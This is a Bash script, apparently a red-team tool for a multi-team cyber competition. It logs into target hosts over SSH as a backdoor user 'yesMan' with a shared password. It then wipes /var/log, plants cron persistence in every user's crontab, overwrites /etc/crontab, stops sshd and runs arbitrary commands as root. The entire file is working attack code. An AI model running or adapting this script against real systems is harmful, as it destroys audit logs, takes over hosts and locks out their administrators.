#!/bin/bash

username="yesMan"
network_id="10.20"
host_ids=(23 24 66)
timeout=5
scoring_link=""
IPs=()

clear_logs() {
    read -p "Team: " team
    read -p "Password: " password
    for IP in "${IPs[@]}"; do
        team_from_IP=$(echo "$IP" | cut -d'.' -f3)
        if [[ "$team_from_IP" == "$team" ]]; then
            sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
                echo \"$password\" | sudo -S rm -rf /var/log/*
            "
            if [[ $? -ne 0 ]]; then
                echo "FAIL: $IP"
            fi
        fi
    done
}

start_persistence() {
    read -p "Team: " team
    read -p "Password: " password
    for IP in "${IPs[@]}"; do
        team_from_IP=$(echo "$IP" | cut -d'.' -f3)
        if [[ "$team_from_IP" == "$team" ]]; then
            sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
                echo \"$password\" | sudo -S bash -c '
                    users=$(cut -d: -f1 /etc/passwd)
                    for user in \$users; do
                        bash -c \"(crontab -u \$user -l; echo \"* * * * * curl $scoring_link\") | crontab -u \$user -\"
                    done
                '
                echo \"$password\" | sudo -S 'echo \"* * * * * yesMan curl $scoring_link\" > /etc/crontab'
                echo \"$password\" | sudo -S 'echo \"* * * * * yesMan curl $scoring_link\" > /etc/cron.d/persistence_minute'
            "
            if [[ $? -ne 0 ]]; then
                echo "FAIL: $IP"
            fi
        fi
    done
}

stop_persistence() {
    read -p "Team: " team
    read -p "Password: " password
    for IP in "${IPs[@]}"; do
        team_from_IP=$(echo "$IP" | cut -d'.' -f3)
        if [[ "$team_from_IP" == "$team" ]]; then
            sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
                echo \"$password\" | sudo -S rm -f /etc/crontab
                echo \"$password\" | sudo -S rm -f /etc/cron.d/persistence_minute
            "
            if [[ $? -ne 0 ]]; then
                echo "FAIL: $IP"
            fi
        fi
    done
}

stop_ssh() {
    read -p "Team: " team
    read -p "Password: " password
    for IP in "${IPs[@]}"; do
        team_from_IP=$(echo "$IP" | cut -d'.' -f3)
        if [[ "$team_from_IP" == "$team" ]]; then
            sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
                echo \"$password\" | sudo -S systemctl stop sshd
            "
            if [[ $? -ne 0 ]]; then
                echo "FAIL: $IP"
            fi
        fi
    done
}

custom_command() {
    read -p "Team: " team
    read -p "Password: " password
    read -p "Command: " command
    for IP in "${IPs[@]}"; do
        team_from_IP=$(echo "$IP" | cut -d'.' -f3)
        if [[ "$team_from_IP" == "$team" ]]; then
            sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
                echo \"$password\" | sudo -S $command
            "
            if [[ $? -ne 0 ]]; then
                echo "FAIL: $IP"
            fi
        fi
    done
}


main() {
    for ((team=1; team<=12; team++)); do
        for host_id in "${host_ids[@]}"; do
            IPs+=("$network_id.$team.$host_id")
        done
    done
    while true; do
        echo "DAKOTA CONQUEST SCRIPTS"
        echo "1. Clear logs"
        echo "2. Start Persistence"
        echo "3. Stop Persistence"
        echo "4. Stop SSH"
        echo "5. Custom command"
        read -p "Choose an option: " choice

        case $choice in
            1) clear_logs ;;
            2) start_persistence ;;
            3) stop_persistence ;;
            4) stop_ssh ;;
            5) custom_command ;;
            *) echo "Invalid choice. Please try again." ;;
        esac
    done
}

main
